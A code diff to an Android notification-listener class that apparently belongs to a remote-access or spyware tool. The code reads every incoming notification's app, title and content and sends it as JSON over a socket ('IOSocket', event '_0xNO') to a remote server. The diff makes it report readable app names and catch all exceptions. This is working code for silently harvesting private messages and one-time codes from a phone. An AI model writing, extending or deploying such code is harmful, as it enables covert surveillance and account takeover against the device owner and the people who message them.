@@ -4,6 +4,9 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.app.Notification;
+import android.content.Context;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.IBinder;
 
@@ -41,15 +44,18 @@ public class NotificationListener extends NotificationListenerService {
             String uniqueKey = sbn.getKey();
 
 
+            PackageManager pm = getApplicationContext().getPackageManager();
+            ApplicationInfo appInfo = pm.getApplicationInfo(appName, 0);
+
             JSONObject data = new JSONObject();
-            data.put("appName", appName);
+            data.put("appName", pm.getApplicationLabel(appInfo));
             data.put("title", title);
             data.put("content", "" + content);
             data.put("postTime", postTime);
             data.put("key", uniqueKey);
 
             IOSocket.getInstance().send("_0xNO", data.toString());
-        } catch (JSONException e) {
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
